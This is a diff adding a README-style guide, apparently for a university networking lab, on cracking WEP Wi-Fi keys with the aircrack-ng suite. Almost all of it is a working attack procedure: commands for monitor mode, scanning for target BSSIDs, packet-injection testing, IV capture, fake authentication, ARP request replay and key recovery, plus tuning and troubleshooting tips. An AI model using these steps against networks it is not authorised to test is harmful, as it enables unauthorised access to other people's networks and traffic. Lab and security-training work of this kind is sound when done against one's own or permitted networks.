@@ -1,0 +1,54 @@
+You should be able to crack the key by following these steps.
+If not, check (with EngrIT) if the network is configured to allow this attack.
+
+If aircrack-ng suite acts weird like:
+    * doesn't start monitor mode
+        - try killing the processes listed in the airmon-ng printout
+    * when attempted to aireplay-ng, channel is fixed at -1
+        - upgrade to v1.2 or reinstall aircrack-ng suite
+
+How to crack WEP
+    * 64 bit key needs about 10k-20k IVs
+    * 128 bit key need about 40k+ IVs
+    * From step 5 and on, you do not need to wait for the command to finish
+        - Leave airodump-ng capturing packets
+        - start fake authentication in another terminal
+        - start cracking the key in another terminal right away
+
+1. Put network interface into monitor mode
+    $ sudo airmon-ng start {wireless_interface}
+    * puts wireless interface into monitor mode
+    * note that channel# is not specified in this step
+    * a new virtual interface will be created
+        - i.e. mon0 using aircrack-ng v1.1, wlan0mon on aircrack-ng v1.2
+
+2. Scan all network in the surroundings
+    $ sudo airodump-ng {monitor_interface}
+    * take note of the bssid of the ssid and the channel# it uses
+
+3. Restart the monitor mode with the channel# specified
+    $ sudo airmon-ng stop {monitor_interface}
+    $ sudo airmon-ng start {wireless_interface} {channel#}
+
+4. Test packet injection
+    $ sudo aireplay-ng -9 -e {ssid} -a {bssid} {monitor_interface}
+    * the result (%) somewhat implies the strength of the wifi signal
+    * if it's 0%, then either your pc cannot perform the attack or something went wrong with the aircrack-ng suite
+
+5. Start capturing the IVs
+    $ sudo airodump-ng -c {channel#} --bssid {bssid} -w {output_file} {monitor_interface}
+    * specify the channel#
+    * save output to file
+
+6. Open another terminal, do fake authentication
+    $ sudo aireplay-ng -1 6000 -o 1 -q 10 -e {ssid} -a {bssid} -h {your_mac} {monitor_interface}
+    * if the result isn't great, play around with the options
+
+7. [optional] ARP request replay, in another terminal
+    $ sudo aireplay-ng -3 -b {bssid} -h {your_mac} {monitor_interface}
+    * useful only when the client/server is generating arp requests (ie pinging to unassigned ip)
+
+8. Open another terminal, start cracking the key using captured IVs
+    $ sudo aircrack-ng -b {bssid} {all_capture_files}
+    * aircrack-ng refreshes itself as more IVs are being captured
+    * note that if you start arp request replay in the middle of cracking, you will need to restart aircrack-ng including the filename of the new capture file of arp request replay
